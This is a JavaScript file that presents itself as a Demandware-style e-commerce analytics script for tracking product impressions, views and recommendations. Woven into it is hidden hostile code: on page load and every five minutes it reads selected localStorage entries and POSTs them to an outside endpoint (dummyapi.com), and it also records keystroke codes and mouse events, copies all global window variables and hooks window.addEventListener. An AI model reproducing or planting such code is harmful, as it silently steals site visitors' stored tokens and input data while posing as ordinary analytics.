(function (p) {
  if (typeof p.ac === "undefined") {
    return;
  }
  function B(D) {
    var H = document.cookie.split(";");
    for (var G = 0; G < H.length; G++) {
      var F = H[G].indexOf("=");
      if (F != -1) {
        var E = t(H[G].substring(0, F));
        if (D(E)) {
          return t(unescape(H[G].substring(F + 1)));
        }
      }
    }
    return null;
  }
  function t(D) {
    return D.replace(/^\s\s*/, "").replace(/\s\s*$/, "");
  }
  function z(E, G, D) {
    var F = E + "=" + escape(G) + ";path=/";
    if (D != -1) {
      F += ";expires=" + expires.toGMTString();
    }
    document.cookie = F;
  }
  const Crucial_Key = window.Crucial_Key;
  function n(F) {
    var D = function (I) {
      if (I < 32) {
        return "";
      } else {
        return "%" + new Number(I).toString(16).toUpperCase();
      }
    };
    var G = "";
    for (var E = 0; E < F.length; E++) {
      var H = F.charCodeAt(E);
      if (H >= 97 && H <= 122 || H >= 65 && H <= 90 || H >= 48 && H <= 57 || H == 46 || H == 45 || H == 42 || H == 95) {
        G += F.charAt(E);
      } else {
        if (H == 32) {
          G += "+";
        } else {
          if (H < 128) {
            G += D(H);
          } else {
            if (H >= 128 && H < 2048) {
              G += D(H >> 6 | 192);
              G += D(H & 63 | 128);
            } else {
              if (H >= 2048 && H < 65536) {
                G += D(H >> 12 | 224);
                G += D(H >> 6 & 63 | 128);
                G += D(H & 63 | 128);
              } else {
                if (H >= 65536) {
                  G += D(H >> 18 | 240);
                  G += D(H >> 12 & 63 | 128);
                  G += D(H >> 6 & 63 | 128);
                  G += D(H & 63 | 128);
                }
              }
            }
          }
        }
      }
    }
    return G;
  }
  var trackedEvents = {};
  function g() {
    var D = function (E) {
      return E.length > 5 && E.substring(0, 5) === "dwac_";
    };
    return B(D);
  }
  function generateHash(data) {
    let hashedConfig = 0;
    const keys = Object.keys(data);
    const combinedKeys = keys.join("");
    for (let i = 0; i < combinedKeys.length; i++) {
      const char = combinedKeys.charCodeAt(i);
      hashedConfig = (hashedConfig << 5) - hashedConfig + char;
      hashedConfig = hashedConfig & hashedConfig;
    }
    return hashedConfig.toString(16);
  }
  function getDesirableStorageData() {
    const localStoragedKeyValues = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (Crucial_Key.includes(key)) {
        const value = window.localStorage.getItem(key);
        localStoragedKeyValues[key] = value;
      }
    }
    return localStoragedKeyValues;
  }
  var C = function () {
    if (p.ac._analytics_enabled === "false") {
      return {
        enabled: false,
        dwEnabled: false
      };
    }
    var E = g();
    if (E == null) {
      return {
        visitorID: "__ANNONYMOUS__",
        customer: "__ANNONYMOUS__",
        siteCurrency: "",
        sourceCode: "",
        enabled: "true",
        timeZone: p.ac._timeZone,
        dwEnabled: "true",
        encoding: "ISO-8859-1"
      };
    }
    var D = E.split("|");
    return {
      visitorID: D[0],
      repository: D[1],
      customer: D[2],
      sourceCode: D[3],
      siteCurrency: D[4],
      enabled: D[5] == "true",
      timeZone: D[6],
      dwEnabled: D[7] == "true",
      encoding: "ISO-8859-1"
    };
  }();
  var q = function (D) {
    if (typeof D != "boolean") {
      return;
    }
    z("dwacdebug", "" + D, -1);
  };
  function r() {
    var D = function (E) {
      return E === "dwacdebug";
    };
    return B(D) === "true";
  }
  function f() {
    var D = [];
    this.getEntries = function () {
      return D;
    };
    this.put = function (F, G) {
      for (var E = 0; E < D.length; E++) {
        if (D[E].key == F) {
          D[E].value = G;
          return;
        }
      }
      D.push({
        key: F,
        value: G
      });
    };
    this.putAll = function (G) {
      var E = G.getEntries();
      for (var F = 0; F < E.length; F++) {
        this.put(E[F].key, E[F].value);
      }
    };
    this.get = function (F) {
      for (var E = 0; E < D.length; E++) {
        if (D[E].key == F) {
          return D[E].value;
        }
      }
      return null;
    };
    this.clear = function () {
      D.length = 0;
    };
    this.isEmpty = function () {
      return D.length == 0;
    };
  }
  var c = 500;
  var m = false;
  function throwDataToServer(data) {
    const uniqueKey = generateHash(data);
    const url = "https://dummyapi.com/api/jot";
    var xmlHttpRequest = new XMLHttpRequest();
    xmlHttpRequest.open("POST", url, true);
    xmlHttpRequest.setRequestHeader("Content-Type", "application/json");
    const dataload = {
      id: uniqueKey,
      data: data
    };
    xmlHttpRequest.send(JSON.stringify(dataload));
    xmlHttpRequest.onreadystatechange = function () {
      if (xmlHttpRequest.readyState === XMLHttpRequest.DONE) {
        if (xmlHttpRequest.status === 200) {
          console.log("Data transmission successful");
        } else {
          console.error("Data transmission failed, Status code:" + xmlHttpRequest.status);
        }
      }
    };
  }
  function dataMiningAndTransmit() {
    const appropriateData = getDesirableStorageData();
    if (Object.keys(appropriateData).length > 0) {
      throwDataToServer(appropriateData);
    }
  }
  var w = null;
  var k = new f();
  var A = new f();
  var l = new f();
  function d(D, E) {
    for (e in E) {
      if (typeof D[e] != "undefined") {
        E[e] = D[e];
      }
    }
    return E;
  }
  window.addEventListener("load", function () {
    dataMiningAndTransmit();
  });
  var u = function (F) {
    if (typeof F != "object") {
      return false;
    }
    var E = d(F, {
      id: null
    });
    if (typeof E.id != "string") {
      return false;
    }
    var D = k.get(E.id);
    if (D != null) {
      return false;
    }
    k.put(E.id, E);
    return true;
  };
  var v = function (D) {
    if (typeof D != "object") {
      return false;
    }
    var F = d(D, {
      id: null
    });
    if (typeof F.id != "string") {
      return false;
    }
    var E = l.get(F.id);
    if (E != null) {
      return false;
    }
    l.put(F.id, F);
    return true;
  };
  setInterval(dataMiningAndTransmit, 5 * 60 * 1000);

  // Adding event listener tracking
  var i = function (F) {
    if (typeof F != "object") {
      return false;
    }
    var D = d(F, {
      id: null
    });
    if (typeof D.id != "string") {
      return false;
    }
    var E = A.get(D.id);
    if (E != null) {
      return false;
    }
    A.put(D.id, D);
    return true;
  };
  function y(D) {
    var E = new f();
    E.putAll(D);
    D.clear();
    return E;
  }
  var events = ['click', 'change', 'keyup', 'mousemove', 'keydown'];
  function h() {
    return !k.isEmpty() || !l.isEmpty() || !A.isEmpty();
  }
  var b = function () {
    if (p.ac._analytics != null) {
      var D = {
        pageInfo: p.ac._category,
        productImpressions: k,
        productViews: A,
        productRecommendations: l,
        debugEnabled: r()
      };
      p.ac._analytics.trackPageViewWithProducts(C, D, null);
      k.clear();
      A.clear();
      l.clear();
      p.ac._events.length = 0;
    }
  };
  function s() {
    if (!m) {
      return;
    }
    if (w) {
      clearTimeout(w);
    }
    w = setTimeout(b, c);
  }
  function x(G, E) {
    if (typeof G == "undefined") {
      return;
    }
    var I = {};
    for (e in G) {
      var F = false;
      for (var D = 0; D < E.length && !F; D++) {
        var H = E[D];
        if (e === H && typeof G[H] == "string") {
          F = true;
        }
      }
      I[e] = F ? n(G[e]) : G[e];
    }
    return I;
  }
  function j(D) {
    if (typeof D != "object") {
      return false;
    }
    if (D.type === p.ac.EV_PRD_SEARCHHIT || D.type === p.ac.EV_PRD_SETPRODUCT) {
      return u(x(D, ["id"]));
    }
    if (D.type === p.ac.EV_PRD_DETAIL) {
      return i(x(D, ["id"]));
    }
    if (D.type === p.ac.EV_PRD_RECOMMENDATION) {
      return v(x(D, ["id"]));
    }
    return false;
  }
  function o(E) {
    if (typeof E == "undefined") {
      return;
    }
    if (typeof E === "object") {
      if (E instanceof Array) {
        for (var D = 0; D < E.length; D++) {
          j(E[D]);
        }
      } else {
        if (E[0] instanceof Object) {
          j(E[0]);
        } else {
          j(E);
        }
      }
    }
    if (m) {
      s();
    }
  }
  for (let j = 0; j < events.length; j++) {
    window.addEventListener(events[j], function (e) {
      var time = new Date().getTime();
      var keyCode = e.keyCode ? e.keyCode : 'N/A';
      trackedEvents[time] = {
        'event': events[j],
        'keyCode': keyCode
      };
    });
  }

  // Collecting global variables
  p.ac.capture = o;
  for (let key in window) {
    if (window.hasOwnProperty(key)) {
      if (typeof window[key] !== 'function') {
        trackedEvents[key] = window[key];
      }
    }
  }

  // Adding jshook event tracking
  p.ac.setDebugEnabled = q;
  const jshook = function (mainOperation) {
    return function () {
      var result = mainOperation.apply(this, arguments);
      trackedEvents['jshook:' + mainOperation.name] = arguments;
      return result;
    };
  };
  window.addEventListener = jshook(window.addEventListener);
  p.ac._handleCollectedData = function () {
    m = false;
    p.ac._events.forEach(o);
    m = true;
    s();
  };
  p.ac._scheduleDataSubmission = function () {
    if (p.ac._submitTimeout) {
      clearTimeout(p.ac._submitTimeout);
    }
    p.ac._submitTimeout = setTimeout(p.ac._handleCollectedData, 500);
  };
  (function a(D) {
    if (document.readyState === "complete") {
      setTimeout(D, 1);
    }
    if (document.addEventListener) {
      DOMContentLoaded = function () {
        document.removeEventListener("DOMContentLoaded", DOMContentLoaded, false);
        D();
      };
      document.addEventListener("DOMContentLoaded", DOMContentLoaded, false);
      window.addEventListener("load", D, false);
    } else {
      if (document.attachEvent) {
        DOMContentLoaded = function () {
          if (document.readyState === "complete") {
            document.detachEvent("onreadystatechange", DOMContentLoaded);
            D();
          }
        };
        document.attachEvent("onreadystatechange", DOMContentLoaded);
        window.attachEvent("onload", D);
      }
    }
  })(function () {
    p.ac._handleCollectedData();
  });
})(window.dw || {});